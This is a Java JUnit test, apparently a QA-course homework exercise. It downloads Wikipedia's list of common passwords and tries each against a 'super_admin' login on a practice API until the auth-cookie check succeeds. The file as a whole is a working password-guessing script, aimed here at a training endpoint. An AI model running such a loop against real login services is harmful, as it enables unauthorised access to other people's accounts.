import io.restassured.RestAssured;
import io.restassured.path.xml.XmlPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;
import java.util.stream.Collectors;

public class PasswordTests {

    @Test
    public void selectionPassword() {
        String login = "super_admin";
        int iterator = 0;
        List<String> passwords = getMostCommonPasswords();

        String message = "You are NOT authorized";
        String password = "";

        while (message.equals("You are NOT authorized")) {
            password = passwords.get(iterator);
            Map<String, String> credentials = new HashMap<>();
            credentials.put("login", login);
            credentials.put("password", password);

            Response response = RestAssured
                    .given()
                    .params(credentials)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = response.getCookie("auth_cookie");
            Map<String, String> authCookie = new HashMap<>();
            authCookie.put("auth_cookie", cookie);

            Response validateCookie = RestAssured
                    .given()
                    .cookies(authCookie)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            message = validateCookie.asString();
            iterator++;
            System.out.println("Авторизация не пройдена");
        }

        System.out.println("Ответ с правильными cookies: " + message);
        System.out.println("Верный пароль: " + password);
    }

    private ArrayList<String> getMostCommonPasswords() {
        XmlPath response = RestAssured
                .given()
                .get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
                .htmlPath();

        String allPasswords = response.getString("**.findAll { it.@class == 'wikitable' }[1]");
        ArrayList<String> listPasswords = new ArrayList<>(Arrays.asList(allPasswords.split("\n")));
        ArrayList<String> uniquePasswords = (ArrayList<String>) listPasswords.stream().distinct().collect(Collectors.toList());
        uniquePasswords.removeIf(pass -> (pass.length() < 4 || pass.length() > 10));
        return uniquePasswords;
    }
}
